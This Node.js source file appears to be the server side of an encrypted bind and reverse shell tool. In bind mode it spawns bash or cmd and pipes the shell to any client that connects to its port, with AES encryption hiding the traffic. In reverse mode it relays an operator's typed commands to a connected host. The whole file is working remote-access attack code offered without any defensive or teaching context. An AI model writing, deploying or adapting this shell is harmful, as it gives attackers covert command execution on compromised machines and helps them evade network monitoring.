const { createServer } = require("net")
const { createInterface } = require("readline")
const { spawn } = require("child_process")
const { CryptorAES } = require('./crypt')
const { listen_address, listen_port, aes_password, aes_iv } = require('./server_config.json')

const crypt = new CryptorAES(aes_password, aes_iv)

const config = {
    host: listen_address,
    port: listen_port,
    exclusive: true
}

function translate_out(cleartext){
    const buffer = Buffer.from(cleartext, 'utf-8')
    const encrypted = crypt.encrypt(buffer)
    return(encrypted)
}

function translate_in(encBuff){
    const decrypted = crypt.decrypt(encBuff).toString('utf-8')
    return(decrypted)
}

function Bind(){
    const server = createServer((socket) => {

        let shellcmd = undefined
        switch(process.platform){
            case "linux":
                shellcmd = "bash"
                break
            case "android":
                shellcmd = "bash"
                break
            case "win32":
                shellcmd = "cmd"
                break
        }
    
        const shell = spawn(shellcmd)
        console.log("INFO:client connected")
        socket.write(translate_out("Connected to remote host"))
    
        // shell stdout to client
        shell.stdout.on("data", (data) => {
            socket.write(translate_out(data))
        })
    
        shell.stderr.on("data", (error) => {
            socket.write(translate_out(error))
        })
    
        shell.on("exit", () => {
            console.log("INFO:client closed the shell")
            process.exit(0)
        })
    
        socket.on("data", (data) => {
            shell.stdin.write(`${translate_in(data)}\n`)
        })
    
        socket.on("error", (err) => {
            console.log(`ERROR:${err}`)
        })
    
        socket.on("end", () => {
            console.log("INFO:client disconnected")
        })
    })
    
    server.listen(config, () => {
        console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
    });
}

function Reverse(){
    const server = createServer((socket) => {
        console.log("INFO:client connected")
    
        const int = createInterface({
            input: process.stdin,
            output: process.stdout
        })
    
        int.on("line", (data) => {
            socket.write(translate_out(data))
        })
    
        int.on("SIGINT", () => {
            socket.end()
            process.exit(0)
        })
    
        socket.on("data", (data) => {
            console.log(translate_in(data))
        })
    
        socket.on("error", (err) => {
            console.log(`ERROR:${err}`)
        })
    })
    
    server.listen(config, () => {
        console.log(`INFO:Listening on ${listen_address}:${listen_port}`);
    });
    
}


switch(process.argv[2]){
    case "b":
        Bind()
        break
    case "r":
        Reverse()
        break
    default:
        console.log("Define an operating mode!")
        console.log("usage:")
        console.log("node server r (Reverse connection)")
        console.log("node server b (Bind connection)")
        process.exit(1)
}